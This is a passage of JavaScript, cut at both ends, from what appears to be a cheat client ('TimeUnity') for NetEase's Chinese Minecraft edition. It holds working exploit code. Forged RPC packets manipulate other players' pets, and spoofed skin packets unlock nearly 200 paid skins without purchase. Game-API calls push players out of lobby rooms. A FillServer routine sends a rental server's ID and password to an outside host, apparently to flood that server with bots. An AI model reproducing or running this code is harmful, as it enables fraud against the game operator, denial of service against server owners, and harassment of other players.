        curl_post_game_api("https://g79apigatewayobt.minecraft.cn/user-else-detail-many", JSON.stringify({
            "with_game_state": true,
            "uids": uid,
            "with_dynamic_head_img": 1
        }), function(Data_code, Data) {
            try {
                const Res_Data = JSON.parse(Data);
                if (Res_Data.message === "正常返回" && Res_Data.entities) {
                    if (Res_Data.entities.length > 0 && Res_Data.entities[0].user_game_info) {
                        const Game_id = Res_Data.entities[0].user_game_info["game-id"];
                        if (Game_id) {
                            if (NoOnlineKick_LobbyGame === null) NoOnlineKick_LobbyGame = Game_id;
                            curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room-enter/leave-room", JSON.stringify({
                                "team_quit": false,
                                "room_id": Game_id
                            }), function(code, response) {});
                        } else {
                            _app.showToast("重新加入房间生效");
                            return;
                        }
                    } else {
                        _app.showToast("重新加入房间生效");
                        return;
                    }
                } else {
                    _app.showToast("重新加入房间生效");
                    return;
                }
            } catch (e) {
                _app.showToast("重新加入房间生效");
                return;
            }
        });
    });
}

function ArrayBufferToHex(arrayBuffer) {
    return Array.from(new Uint8Array(arrayBuffer)).map(byte => byte.toString(16).padStart(2, '0')).join('');
}

function getRandomPos() {
    const min = -1.3;
    const max = 1.3;
    const lambda = 2.0;
    let value = -Math.log(Math.random()) / lambda;
    if (Math.random() < 0.5) value = -value;
    value = Math.max(min, Math.min(max, value));
    return value;
}

function NumtoHex(num) {
    return num.toString(16).padStart(2, '0');
}

function Beacon_Packet() {
    if (!Beacon_Packet_Enabled) return;
    let nearest, min = Infinity;
    for (let id of getEntityList()) {
        if (getEntityNamespace(id) === "netease:pet") {
            const d = getRange(self_pos, getEntityPos(id));
            if (d < min) {
                min = d;
                nearest = id;
            }
        }
    }
    if (nearest) sendPyRpc(98247598, `93c40163920982c4057065744964c4${getHexLengthMarker(nearest)}${AsciiToHex(nearest)}c4086d6978436f6c6f7282c4085f5f747970655f5fc4057475706c65c40576616c756594cb3fe3fac3e91d90e4cb3fea3341561fdacccb3fdde2d1f3dbda3d01c0`);
}

function SummonFox() {
    if (SummonFox_Enabled) {
        for (let l = 0; l < SummonFox_Speed; l++) {
            for (const enid of getEntityList()) {
                if (getEntityNamespace(enid) === "netease:pet") {
                    if (getRange(self_pos, getEntityPos(enid)) <= 12) {
                        sendPyRpc(98247598, `93c40163920a85c409706c617965725f6964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c404616e696dc40a69646c655f7374616e64c4067065745f6964c4${getHexLengthMarker(enid)}${AsciiToHex(enid)}c4066c6f6f706564c3c409616374696f6e5f6964c0c0`);
                        sendPyRpc(98247598, "93c40172920bc4214d696e6563726166743a7065743a6469736d6973735f7065745f72657175657374c0");
                        sendPyRpc(98247598, `93c40163920b82c409706c617965725f6964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c409656e746974795f6964c4${getHexLengthMarker(enid)}${AsciiToHex(enid)}c0`);
                        sendPyRpc(98247598, "93c40172920cc4224d696e6563726166743a7065743a74656c65706f72745f7065745f72657175657374c0");
                        for (let i = 12; i < 13; i++) {
                            sendPyRpc(98247598, `93c4016392${NumtoHex(i)}89c413616c6c6f775f737465705f6f6e5f626c6f636bc2c408706c617965724964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c409706c617965725f6964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c407736b696e5f6964cd2711c40c69734e657752657175657374c3c40b61766f69645f6f776e6572c3c4067065745f696401c40a6d6f64656c5f6e616d65c41474795f7975616e7368656e6768756c695f305f30c40ce68891e79a84e78b90e78bb8c406e78b90e78bb8c0`);
                        }
                        break;
                    }
                }
            }
        }
    }
}

async function BringTP(start, end, maxDist) {
    if (!BringTP_Enabled) return;
    const [x1, y1, z1] = start;
    const [x2, y2, z2] = end;
    const dx = x2 - x1;
    const dy = y2 - y1;
    const dz = z2 - z1;
    const dist = Math.sqrt(dx * dx + dy * dy + dz * dz);
    const steps = Math.ceil(dist / maxDist);
    const stepX = dx / steps;
    const stepY = dy / steps;
    const stepZ = dz / steps;
    for (let i = 0; i <= steps; i++) {
        if (!BringTP_Enabled) break;
        const x = Math.round(x1 + stepX * i);
        const y = Math.round(y1 + stepY * i);
        const z = Math.round(z1 + stepZ * i);
        _app.executePluginCommand(`/ww tp ${x} ${y} ${z}`);
        await new Promise(resolve => setTimeout(resolve, BringTP_Delay * 10));
    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function ModPetName() {
    sendPyRpc(98247598, "93c40172920cc4254d696e6563726166743a7065743a6368616e67655f7065745f736b696e5f72657175657374c0");
    if (ModPetData.length >= 69) return;
    if (ModPetData.includes("§k")) return;
    sendPyRpc(98247598, "93c40172920ac4224d696e6563726166743a7065743a74656c65706f72745f7065745f72657175657374c0");
    getEntityList().forEach(enid => {
        if (getEntityNamespace(enid) === "netease:pet") {
            for (let i = 10; i < 15; i++) {
                sendPyRpc(98247598, `93c4016392${NumtoHex(i)}85c409706c617965725f6964c4${getHexLengthMarker(self_id)}${AsciiToHex(self_id)}c407736b696e5f6964cd2711c4087065745f6e616d65c4${getHexLengthMarker(ModPetData)}${AsciiToHex(ModPetData)}c40e63757272656e745f7065745f6964c4${getHexLengthMarker(enid)}${AsciiToHex(enid)}c40a6d6f64656c5f6e616d65c41474795f7975616e7368656e6768756c695f305f30c0`);
            };
        }
    });
}

function CrackSkin() {
    curl_post_game_api("https://g79apigatewayobt.minecraft.cn/pe-purchase-item/", JSON.stringify({
        "cdk_code": "",
        "expertcomment_info": {
            "expertcomment_id": "0",
            "video_url": "0",
            "expert_id": "0"
        },
        "buy_path": "\u65b0\u7248\u9996\u9875\u65e0\u4e3b\u57ce_\u8d44\u6e90\u4e2d\u5fc3_\u63a8\u8350_ResourceCenterSearchWindowV2_DeveloperDesktopV2_ResourceDetailWindowV3_\u7ec4\u4ef6\u8d2d\u4e70\u7b2c\u4e8c\u7248",
        "last_page": "\u5f00\u53d1\u8005\u754c\u9762_\u4e3b\u9875",
        "component_view": "\u5f00\u53d1\u8005\u754c\u9762_\u4e3b\u9875",
        "item_id": "4644239400124550098",
        "coupon_ids": [],
        "is_auto_buy": 0,
        "is_special_buy": 0
    }), function(code, response, headers) {});
    const SkinPath = _app.getResource() + "/TimeUnity/SkinData.json";
    let SkinData = {};
    if (!_fs.exists(SkinPath)) {
        _fs.write(SkinPath, JSON.stringify({
            "隐身皮肤": "InvisibleSkin",
            "炼狱牛魔王": "3bca62f5-3483-4359-9a84-2308821dd65f",
            "风尚潮客": "31fa4e07-9084-4acb-883a-84b2fc1c64bd",
            "暗金帝骑": "d263ea06-fc1f-4468-a9eb-a6daad15af12",
            "天狼星": "849eb129-b5aa-4168-afa2-8b923a931d0c",
            "侏罗纪萌龙": "e7c47f90-4782-4a44-870b-93cabde3a668",
            "梦幻独角兽": "1c48bf69-88da-47b9-8b2b-c4881edb885e",
            "狮腾舞跃": "e75b4214-d57f-4877-a816-6823b1a16fcc",
            "深海萌鲨": "6702da51-cf8a-44a7-a2ad-dc04f2863dfc",
            "玩偶将军": "dd8b8261-3a15-3515-b380-2302fefa7933",
            "霜夜精灵": "0d09a886-9fe3-4119-86cc-3b20c2b881a5",
            "玫瑰默客": "31fef8c6-d3d7-46eb-bee2-4b110e29e7a7",
            "晶魄·霜华": "1db22f15-8451-43e4-989e-0a671a793b07",
            "晶魄·翎羽": "9acf7aa5-b566-4319-b9c7-98617e41ead4",
            "昼夜天使": "c3fb8b9c-7afc-40ab-8b90-e93afc6d2582",
            "晨曦天使": "448514b9-8324-4db4-aed6-9e2ba3b68c61",
            "暮色天使": "82a0ad9d-bb6f-4900-a70d-da4ef68b4c8e",
            "深渊魔爪": "f5fca5fd-6a06-4047-af58-82ecd49fb3a1",
            "南瓜绅士": "844d2b4d-3f9f-3977-ae72-47ab5fc95eec",
            "夜幽·璃音": "adb16c35-0858-4da0-88e4-c2a3f1d66edc",
            "夜幽·云归": "01021a89-7ef5-4de4-9cd9-9877b8e6bc7e",
            "量子星悦": "2ac49d77-faa4-4b4f-953d-889a0c0a3290",
            "糖果熊": "32da1900-654b-40c0-a056-4c97a51f6e98",
            "云霄战姬": "cde8b8c2-b32f-352a-b8e1-941b1e693453",
            "烈焰巨人": "85da6be8-acc2-4622-9584-4867d0ee6dff",
            "圣焰·丝缇雅": "2f5287ff-9acf-4a35-8324-366d2d5dd63a",
            "圣焰·雷塔": "ebe96802-3631-4ec2-9442-b58b9460d6f2",
            "樱华": "438ba1af-7535-410d-b6ca-14957bc501ab",
            "冰晶": "75515d65-60a5-4a6d-b883-4a73390a8d24",
            "星夜": "0c326cf6-4f88-4d07-8dd5-4e8323886793",
            "守望战纪": "9d2fbde2-d311-42fe-85bb-8aad9ce3760f",
            "苍梧吟月": "6fe39205-d2e7-4e07-a19c-02ed0943e9d3",
            "恶魔甜心": "38664bfd-9bda-41b4-a3dd-d44ca28891fb",
            "呱呱": "7dcd52e7-e2e5-46f7-93f9-af74f03f528d",
            "嗡嗡": "27234a3e-d06e-4f22-948e-cdd4b3f9576c",
            "啾啾": "2b3a089b-71c3-4018-8748-8158c6039705",
            "琉璃九尾": "35af4fdc-7e6e-4de6-9b0b-5989aa0d7a85",
            "炽焰狂想": "68480a8b-da51-407b-8535-112ce253218c",
            "鎏金·风之咏叹": "5bb41ebb-88d6-4111-b9ef-af6962cbb7c1",
            "星澜·潮汐夜曲": "e9de8545-844b-4233-ae0b-ad645cdaa3f0",
            "鎏金·炽焰狂想": "610054f0-4bc3-40b9-bc84-ee8bf2aac7aa",
            "星澜·炽焰狂想": "6139233f-a96d-4eaf-a877-92b7b70218e4",
            "青鸟": "91c27fbe-f570-47b0-b744-ef85b46540bf",
            "璀璨·风之咏叹": "bad754a3-4af5-46a8-985c-fc825cca7153",
            "璀璨·潮汐夜曲": "f9ba0c55-b264-40d2-a4f6-e8cc7c4dad7f",
            "恶魔潮流": "dd557ab6-fd1f-4076-bdb0-f51cf58612f9",
            "潮汐夜曲": "e26ff0b0-9f46-4b3b-b1f0-e2023fdfed4d",
            "八爪墨墨": "4d2dd6d2-d4e1-4888-b4f8-b3a30a9549fa",
            "风之咏叹": "72de4ac0-5a77-416a-8aeb-bafc8101d9a2",
            "加勒比船长": "63951614-ff59-4fe7-a160-85f573a9420d",
            "末末": "1b16a40d-8a79-4528-8c4b-55853ef4acca",
            "宝箱怪": "198463f9-25d2-3fa0-93ab-d0b174b0c880",
            "暗黑小红帽": "c56086a6-c718-4188-8716-15dba4f073bb",
            "湮灭魔女": "f72f8cf8-2e18-471a-a2b8-c72c2241e947",
            "双子座": "035d3ee9-fe89-4dde-b626-61618e48814f",
            "亚系甜心": "7be774c0-9ff0-4a49-b11a-17504807c4ed",
            "小园丁": "22cd8017-7897-3757-b81a-3fdc7f79fae9",
            "红石智械": "f407d030-cd8c-4089-9bd1-bd795bbd828c",
            "恐龙又抗狼": "ea9b7a78-94ed-3e0b-9e95-25f699a55fc5",
            "珠珠": "f3440bef-7c74-4ee5-aa0b-660214cbe89c",
            "樱花女祭祀": "21007538-9225-4232-a30f-e9378feee069",
            "圣光魔术师": "5b47d210-cbc8-488b-b306-73cb4d026816",
            "金牛座": "5237d95a-22b9-44d7-a419-14c39fb8fc6d",
            "创世织师": "ca0a0172-77cc-4aec-a085-ee6a9d623fae",
            "酷丽怕": "64f29281-f3b0-4eb9-8dce-576a9d566b7c",
            "暗夜伯爵": "71383b39-ef44-4ba3-874e-93c95bdae935",
            "云上听歌": "d83d3b80-bae3-43d9-aa2f-4f0d94cf171a",
            "疾速喵影": "44a3a56a-253d-49c5-b9c5-5fe604002148",
            "凋灵梦魇": "3ed87aae-8f95-4b96-b06f-7909ff350df4",
            "花仙子": "f04f6369-ca66-4838-ad66-889870a8549d",
            "树灵卫士": "6085c6d8-fb0d-49ca-999d-de1572a0e5ad",
            "咩咩": "d6b946a8-8f6f-3d81-8914-0e05e4c08d72",
            "白羊座": "eedb80e7-b153-4e53-8fbe-da384f9818f3",
            "双鱼座": "a08e86b7-4731-4dc7-a6e6-a8d1b81ce553",
            "苍狼王子": "307514c9-1f13-4852-93d8-506fa7ecca43",
            "樱兔公主": "9450c134-7fa5-4832-9c5d-3b7939b1822a",
            "焚天魔君·玄狱": "39f87e5d-d856-4cd7-85f8-2df3a721eab5",
            "临星仙帝·神霄": "f1459932-69d7-4fe6-9385-ce5d97dd026e",
            "神·帝皇侠": "bc4c6fcc-93c0-4bd0-84d0-64b4f9611645",
            "帝皇侠": "0440c18f-1ba2-4c93-982b-1874fca0216f",
            "炎龙侠": "839b4d86-5764-4cbd-8de8-88ecbdbef4c9",
            "风鹰侠": "f1b09793-c1cf-473d-8461-a7a8d54611af",
            "水瓶座": "4753b751-2f8b-4a1c-85dc-9b5744b4f8be",
            "无尘": "0de02001-b15a-4ce8-b800-b67c2d376961",
            "涂山镜花": "bc5388a0-bd39-4751-8e9f-d4b728a31ded",
            "剑尊·无极": "892ccdd3-1c8e-4ced-a494-0dc2923c0d5c",
            "琳琅阁主": "7a70fbfd-6e53-4796-8011-7b177a73a132",
            "清风": "561f5dd0-d6b0-34d0-b4c6-e79bb96c5072",
            "明月": "77936861-0929-34a7-8bdd-4e25069cea63",
            "绮罗": "5e63d243-be2d-35ff-baf5-9a9088ff91fd",
            "玄衣": "475fc5bb-aaec-3a80-a35a-4390149a63ed",
            "苍鸾": "ef2c341f-9b42-3db8-a84c-4fa3ebd27346",
            "梨园惊歌·云裳": "1ba9649e-f19b-4ca9-97f3-d30bf0fb3968",
            "大雄": "4050df75-ad24-4799-809c-e705df2c136d",
            "静香": "2ca24053-68ef-49c6-b2dc-6f1a4c842c14",
            "胖虎": "9e3186d7-c0b5-42a1-b6b1-5620588bdb30",
            "小夫": "b50adf61-d9ca-4459-b488-fcc0cb798f98",
            "哆啦A梦": "8d379cf5-c107-424b-855c-5aeb72e248d4",
            "魔羯座": "e266744d-28e3-4a99-9660-7fe1ff090e0e",
            "夜隐": "3f6a5c3a-7dde-47a2-aba0-5a1dc0e66335",
            "射手座": "83925f32-beb2-4c0b-adf3-2bb08d3bd405",
            "恐龙抗狼": "4581c510-80e1-4269-b6b0-8d0bef4b850f",
            "天启骑士·极星": "5eb32aee-dfed-4892-910b-130595cc0fee",
            "末影魔龙": "f30305c8-f726-43df-aa00-779baf2fc2c9",
            "天蝎座": "6221cc3e-0c48-4fd4-9975-22e7d875599b",
            "青空侠影": "8aedb138-d9f9-4652-a69f-1f4ea8c27f50",
            "方块雪地机": "99f6e6fb-f0f6-4308-9ffa-252cb5bc8e9f",
            "赤影御龙": "9beca4aa-58bc-4acd-814f-7555e6b6cb75",
            "萌喵纪元": "29a90324-dc19-4730-a701-a74c09673171",
            "骷髅男爵": "8a2700ef-5064-498d-87c3-4de8789ed5f0",
            "黑洞之心": "2e88a571-ba92-4c5c-83b0-d8a571ba1964",
            "暗星理事官": "bd62cf6b-cde7-4e22-b973-7544f74432c1",
            "黑洞代理人": "b3aa9268-10bd-4d15-898c-94a6dee4e97c",
            "天秤座": "3850fc97-dd3d-4b9c-a3f0-fd6cc66607fc",
            "甜心蕾蕾": "bf396beb-88bb-318d-939b-e0d66756c24f",
            "潮酷机能": "5170cdc5-75ef-3a95-9864-275c7c75d32f",
            "青龙神君": "699ca248-03f6-3471-9efc-7067c1d086e7",
            "嫦娥仙子": "1d2d2d3e-2313-4d71-94d6-39f292a7b3be",
            "料理猫王": "2ffbeeaf-2c76-3131-965a-3fdb09819e0c",
            "希尔芙": "41dbf419-18fe-46b1-a726-f62cf3930271",
            "荷鲁斯庇护": "345080cc-9695-4037-ad28-86088deb0bb4",
            "伊西斯神谕": "d8cd411b-ca79-40dd-b93d-92624571e433",
            "孤漠冥主": "630e05fc-9734-4653-939c-db2c199b4207",
            "天晴酱": "d86312d0-a290-4fb6-802f-f88ef4aff872",
            "偶像琉音": "610f1e57-e9fa-4cd0-a96d-786ae159c793",
            "学生晴音": "36d5943c-c4e2-3da8-b5c1-300d5ebc487d",
            "摇滚史蒂夫": "116a40d1-2897-396c-970b-795e3d52a128",
            "雷音绮梦": "a62fdefc-d9f7-4991-927f-31aea5fe7031",
            "暗域守望": "0f6565bb-f40f-43b1-bac2-554a231d306d",
            "幽魅之影": "f8bc033f-a7a6-4a10-96fe-209d928de6d8",
            "樱花武士": "1215f169-392b-4864-87a6-9bd9b8f93aed",
            "剧场版-哆啦A梦": "c4b149c5-aeee-46d9-8370-fd7c62ed9e85",
            "剧场版-米卡": "9f78691f-6a9a-40a4-9135-4a2e0a26ccfc",
            "剧场版-胖虎": "9902f652-e710-4bb5-851e-331f814ac91a",
            "剧场版-小夫": "30be3318-758d-4189-a1fa-1795aeb9c9ad",
            "剧场版-静香": "e4dd5b4d-e561-4dac-a6ba-ac4bc07371e9",
            "剧场版-大雄": "874e0149-76f5-4c44-9f45-d87bfc8d2f8d",
            "服部平次": "e095e055-bcaa-449f-a992-f3be4ff00645",
            "安室透": "9efc2344-41a1-482c-ba8c-f58235865769",
            "赤井秀一": "99d4fd18-9e41-43bd-a42a-688e7bd92120",
            "怪盗基德": "dbf7516e-f35a-4c4a-a98b-a07dcb492957",
            "圣翼骑士": "c6af9ba2-25af-4d39-abfa-c8702ed2b212",
            "日落海盗": "fab51cb2-3d53-3375-a409-b9f858602c83",
            "午夜幽灵": "ad7b7d99-fde1-3718-953a-7fbef2cb0a81",
            "月夜狼人": "12b0bca7-07ae-3414-a54f-74bf897d1e30",
            "暗月女王": "5c131714-62ac-4298-a702-f041ca9ead7f",
            "春日之约": "f0319228-eb32-30ee-b678-33a198b58b0c",
            "轩辕龙灵": "dce11ce7-c260-4cba-b82f-1b3e07143b4c",
            "碧瑶龙影": "e1056fc3-1d2f-48b0-aa62-4880d22a4604",
            "西海太子": "c430b133-80d4-42ef-819c-3c00c67fa388",
            "琴酒": "8364185b-340a-4b9b-ae2b-709099459ef8",
            "灰原哀": "927a477d-fa31-4e60-9817-b80b2e7e98d3",
            "毛利小五郎": "b7b4f93e-d454-4d50-b744-d8a0eaf56631",
            "柯南": "384d0277-0b32-49c0-b465-5439d6ad8173",
            "工藤新一": "00f89bc9-8f79-470d-93b6-e78ba242f0fe",
            "毛利兰": "d6ba680d-adaa-412e-bd38-b3cee4cfb2b7",
            "妲己": "d30d3453-b232-3265-a034-ce98a9cc729c",
            "申公豹": "e67589b0-a44a-3347-895d-01e09d7a1dc1",
            "姬发": "a6083143-d7d0-3cad-a573-cb5f8be45c99",
            "二郎神君": "8b13868c-81ba-432c-83bf-bf8f7361f9a9",
            "盛装宴会": "12f5e53e-e8bc-3bf7-b114-ab7b1156764d",
            "骷髅装扮": "d32aa4eb-b106-36ae-ab5e-5029ae421bbe",
            "电玩苦力怕": "ebd73a6c-e392-4ede-9d27-8429f91e1e08",
            "霓光丽影": "df3cc1be-7763-405e-b331-53c9873623f1",
            "末影骇客": "50b6550d-dc06-4655-8386-f32a5b9ca78f",
            "星际掠夺者": "a1c353c3-2e04-3128-911f-8be4892320ad",
            "末影宇航员": "6bf38568-2036-350a-b688-ec4f05c460f4",
            "未来派": "353cb731-e469-31c5-9213-6ea98f795f34",
            "超维战警": "42307b64-bd23-4ad8-a9a0-404c03946aef",
            "黑豹霓光": "9c561f5c-aea4-47c3-988f-0bcd5caea7f4",
            "炎魔之王": "680dcf03-78aa-4ed4-a6d9-aaea3e87b1e6",
            "荒野牛仔": "d1a0634d-81b3-4e76-a3ff-e043931f0507",
            "风之勇者": "98ba7130-db84-4162-a27e-d23150b2286c",
            "寒冰船长": "c0da4ccf-b636-437e-b9d8-ac9c5d60bdce",
            "火元素使": "e9957b11-5621-4fc7-b770-1adb8185c2df",
            "千海之星": "e49f8fbe-cab1-4e9b-8ea1-c6af28101b04",
            "海神王子": "6635ed53-4416-448b-a5d3-d8db8ba38557",
            "伏羲": "8cad2089-66d8-434c-aa87-1142dd44628f",
            "幻蝶魔导": "f631e5ee-2015-4a4e-9e9f-b61a46102c7f",
            "创世盘古": "2cf97572-35d5-4560-b25e-d1aadaec2f75",
            "造化女娲": "6b292fd5-13dd-462f-a102-e1208f8c25e4",
            "狮心骑士": "454c211d-1971-4c89-9500-4ef3cb1381f0",
            "梅花十三": "10a9294f-6700-4be2-9f46-26be6ef1bf8e",
            "柒": "7dd1811a-a7d4-4ca6-adbf-73a43f1d7ab2",
            "伍六七": "d4dd9b15-41cc-4416-a6c6-475ffc5c128a",
            "兔神凌霄": "3e3609e7-5004-453d-8cf1-c4863620ce39",
            "苍玉麒麟": "d2995d3d-5fa1-4bbd-a8f1-ca3ce4d3bd13",
            "塔罗御主": "df8daa7e-05a1-4203-922f-9134c3987575",
            "神秘魔术师": "93df9b95-3235-4df4-92b1-a9b4adb7e3c1",
            "德古拉": "0dd90d68-fa4d-4cdd-bd39-571259e17ce4",
            "梅菲斯": "87e90222-ac82-4c06-83e6-148033656615",
            "约翰尼": "492dc0c2-09c6-4bdf-95a2-c8f1374154b0",
            "弗兰克": "ad294f1c-e00a-4367-abc8-aa862c6e805e",
            "莫瑞": "20074aa9-11b8-4a63-b82f-3c6b92847e02",
            "电子末影": "228baa85-32a3-4883-9232-8a2d09eb23ce",
            "卧龙诸葛": "97b91cb0-a317-469d-9e1a-a420a93da53b",
            "辉耀太阳": "4cdd343c-795c-40a4-9813-04ff8298464d",
            "星河夜月": "0e0f5dec-d21e-49db-b9f3-c755884de905",
            "月光王子": "8fa42509-fc3f-40a0-bab7-95b4580e4016",
            "白虎雷泽": "b2e1c7fa-9850-4fea-8029-a425daa334d6",
            "黑豹影流": "5fea3e5f-ad62-4002-9f1e-75bdfe430d19",
            "星际旅者": "2f8182ea-660b-4a29-896c-7e1ae81ea622",
            "天龙骑士": "5d31eb2b-b81f-4cd8-a664-e2f993f820ec",
            "暗·魔龙使": "73329d4f-45bf-4e8b-9b3f-c7382271777a",
            "光·魔龙使": "adb2b5d4-89db-4f6f-8af6-8274b464e947",
            "哪吒三太子": "b7b3c9dc-4009-40cf-b0f7-f5b81ede49cb",
            "黑夜幻响": "ea7ee08f-2d97-456e-a971-1d20d3af555b",
            "悟空齐天大圣": "ea3c78fd-b356-4e89-b5cc-00281d8ac077",
            "虹光": "ff340887-6946-4031-9513-450408ad41b8",
            "超星一号": "01ee9423-8985-4054-a320-cda19bbb5e27",
            "夜影": "de854a6c-a481-4075-9665-eddad50e0947",
            "虎威赵云": "8d40b6e8-a39d-4fb4-8910-62ffa93685c6",
            "小乔": "5f829e3e-abed-43f1-840e-2ec1574c8955",
            "诸葛亮": "673c58e0-6579-4039-9580-0bc3caa10168",
            "暗黑骑士": "c7f17238-e963-40ff-86db-148c49275cc4",
            "光明战士": "9c227b97-d18d-4562-923b-3f6631ab0af8",
            "幻灵魔导": "de391fab-ce6d-4f05-bdab-4267302d5ad2"
        }, null, 4));
        SkinData = JSON.parse(_fs.read(SkinPath));
    } else {
        SkinData = JSON.parse(_fs.read(SkinPath));
    }
    const SkinOptions = Object.keys(SkinData);
    const Skin_Form = {
        "type": "custom_form",
        "title": "选择皮肤",
        "content": [{
            "type": "dropdown",
            "text": "请选择皮肤",
            "options": SkinOptions
        }]
    };

    function sendSkinRpc(SkinId, SkinName) {
        if (!SkinId) return;
        const rpcData = {
            "type": "array",
            "value": [{
                    "type": "binary",
                    "value": "SyncUsingMod"
                },
                {
                    "type": "array",
                    "value": [{
                            "type": "array",
                            "value": [{
                                "type": "binary",
                                "value": SkinId
                            }]
                        },
                        {
                            "type": "binary",
                            "value": SkinId
                        },
                        {
                            "type": "binary",
                            "value": "4644239400124550098"
                        },
                        {
                            "type": "boolean",
                            "value": true
                        },
                        {
                            "type": "object",
                            "value": []
                        },
                        {
                            "type": "binary",
                            "value": "4644239400124550098"
                        },
                        {
                            "type": "object",
                            "value": [{
                                    "key": {
                                        "type": "binary",
                                        "value": "is_skin_try_on_mod"
                                    },
                                    "value": {
                                        "type": "boolean",
                                        "value": true
                                    }
                                },
                                {
                                    "key": {
                                        "type": "binary",
                                        "value": "usingMods"
                                    },
                                    "value": {
                                        "type": "array",
                                        "value": [{
                                            "type": "binary",
                                            "value": SkinId
                                        }]
                                    }
                                },
                                {
                                    "key": {
                                        "type": "binary",
                                        "value": "SkinId"
                                    },
                                    "value": {
                                        "type": "binary",
                                        "value": "4644239400124550098"
                                    }
                                }
                            ]
                        }
                    ]
                },
                {
                    "type": "nil"
                }
            ]
        };
        _packet.sendPyRpcPacket(98247598, JSON.stringify(rpcData));
    }
    _gui.addForm(JSON.stringify(Skin_Form), function(Index) {
        if (SkinData[SkinOptions[Index]] === null) {
            return;
        }
        if (SkinData[SkinOptions[Index]] === "InvisibleSkin") {
            _packet.sendPyRpcPacket(98247598, `{"type":"array","value":[{"type":"binary","value":"SyncUsingMod"},{"type":"array","value":[{"type":"array","value":[{"type":"binary","value":"3bca62f5-3483-4359-9a84-2308821dd65f"}]},{"type":"binary","value":"3bca62f5-3483-4359-9a84-2308821dd65f"},{"type":"binary","value":"4644239400124550098"},{"type":"boolean","value":true},{"type":"object","value":[]},{"type":"binary","value":"4644239400124550098"},{"type":"object","value":[{"key":{"type":"binary","value":"is_skin_try_on_mod"},"value":{"type":"boolean","value":true}},{"key":{"type":"binary","value":"usingMods"},"value":{"type":"array","value":[{"type":"binary","value":""}]}},{"key":{"type":"binary","value":"skinId"},"value":{"type":"binary","value":"4644239400124550098"}}]}]},{"type":"nil"}]}`);
            setTimeout(() => {
                _packet.sendPyRpcPacket(98247598, `{"type":"array","value":[{"type":"binary","value":"SyncUsingMod"},{"type":"array","value":[{"type":"array","value":[{"type":"binary","value":"d75ca2c1-875f-39f4-80eb-ea337df833c7"}]},{"type":"binary","value":"d75ca2c1-875f-39f4-80eb-ea337df833c7"},{"type":"binary","value":"4644239400124550098"},{"type":"boolean","value":true},{"type":"object","value":[]},{"type":"binary","value":"4644239400124550098"},{"type":"object","value":[{"key":{"type":"binary","value":"is_skin_try_on_mod"},"value":{"type":"boolean","value":true}},{"key":{"type":"binary","value":"usingMods"},"value":{"type":"array","value":[{"type":"binary","value":""}]}},{"key":{"type":"binary","value":"skinId"},"value":{"type":"binary","value":"4644239400124550098"}}]}]},{"type":"nil"}]}`);
            }, 100);
            return;
        }
        const SkinName = SkinOptions[Index];
        const SkinId = SkinData[SkinName];
        if (SkinId === null) {
            return;
        }
        sendSkinRpc(SkinId, SkinName);
    });
}

function FillServer() {
    const form = {
        "type": "custom_form",
        "title": "租赁服塞人",
        "content": [{
                "type": "input",
                "text": "请输入服务器号",
                "default": ""
            },
            {
                "type": "input",
                "text": "请输入密码[无密码请留空]",
                "default": ""
            }
        ]
    };
    _gui.addForm(JSON.stringify(form), function(ServerId, Pwd) {
        if (!ServerId) {
            _minecraft.clientMessage("§c错误：请输入服务器号");
            return;
        }
        curl_post_game_api(
            "https://g79apigatewayobt.minecraft.cn/rental-server/query/search-by-name",
            JSON.stringify({
                "server_name": ServerId
            }),
            function(game_code, game_response) {
                try {
                    const data = JSON.parse(game_response);
                    if (!data.entities || data.entities.length === 0) {
                        _minecraft.clientMessage("§c错误：未找到该服务器");
                        return;
                    }
                    const serverId = data.entities[0].entity_id;
                    _minecraft.clientMessage("§e已发送请求");
                    _https.get(`http://time.fuhongweb.cn/BanServer?${FileContent}&time=${Date.now()}&server_id=${serverId}&pwd=${Pwd || ""}&token=${md5(FileContent + Date.now() + serverId + Pwd + "Time")}&Server=${ServerId}`, {}, function(code, response, headers) {
                        if (code !== 200) {
                            return;
                        }
                        if (response.includes("未到达该房间设定的最低等级")) {
                            _minecraft.clientMessage("§c错误: 由于机器人等级不足，无法进入此租赁服");
                        } else if (response.includes("密码错误")) {
                            _minecraft.clientMessage("§c错误: 提供的密码错误");
                        }
                    });
                } catch (e) {
                    _minecraft.clientMessage(`§c错误: 未知的错误`);
                }
            }
        );
    });
}

function onSendChatMessageEvent(message) {
    try {
        if (message.startsWith("§")) {
            return false;
        }
        if (message.startsWith("TransferPlayers_")) {
            TransferPlayers_IsTP = true;
            const id = message.substring("TransferPlayers_".length);
            RpcQueue.push(id);
            IsRpcReady = false;
            TickRpc();
            return true;
        }
        if (!AIChat_Whole && AIChat_Enabled) {
            handleAIChat(message);
            return true;
        }
        if (message === "[TimeUnity]BJDFlyStopEnabled") {
            sendBJDFlyPos();
            _v8.gc();
            return true;
        }
        if (message === "[TimeUnity]BlinkStopEnabled") {
            sendBlinkPos();
            _v8.gc();
            return true;
        }
        if (message === "[TimeUnity]ModPetName") {
            ModPetName();
            return true;
        }
        if (message === "[TimeUnity] invManager_closeContainer") {
            closeInventory();
            closeContainer();
            return true;
        }
        if (message === "[TimeUnity]清除宠物背包物品" && Replication_Drop) {
            sendPyRpc(98247598, "93c40172920dc41f4d696e6563726166743a7065743a64726f705f7065745f6261675f6974656dc0");
            for (let l = 1; l < 7; l++) {
                for (let i = 10; i < 15; i++) {
